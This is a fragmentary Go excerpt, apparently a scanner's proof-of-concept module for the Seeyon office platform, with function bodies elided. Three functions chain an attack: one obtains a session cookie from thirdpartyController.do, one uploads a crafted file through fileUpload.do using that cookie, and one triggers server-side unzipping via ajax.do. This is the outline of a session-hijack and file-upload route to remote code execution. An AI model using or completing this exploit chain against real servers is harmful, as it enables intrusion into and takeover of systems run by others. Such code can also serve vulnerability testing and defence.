...
func getsession(u string, client *httpx.Client) string {
	...
	if req, err := client.Request(u+"/seeyon/thirdpartyController.do", "POST", data, header, "Poc SeeYon"); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "a8genius.do") && req.RespHeader.Get("Set-Cookie") != "" {
			return req.RespHeader.Get("Set-Cookie")
		}
	}
	return ""
}
...
func upload(u string, cookie string, client *httpx.Client) string {
	...
	if req, err := client.Request(u+"/seeyon/fileUpload.do?method=processUpload", "POST", buf.String(), header, "Poc SeeYon"); err == nil {
...
func unzip(u string, filename string, cookie string, client *httpx.Client) bool {
	...
	header["Content-Type"] = "application/x-www-form-urlencoded"
	header["Cookie"] = cookie
	if req, err := client.Request(u+"/seeyon/ajax.do", "POST", data, header, "Poc SeeYon"); err == nil {
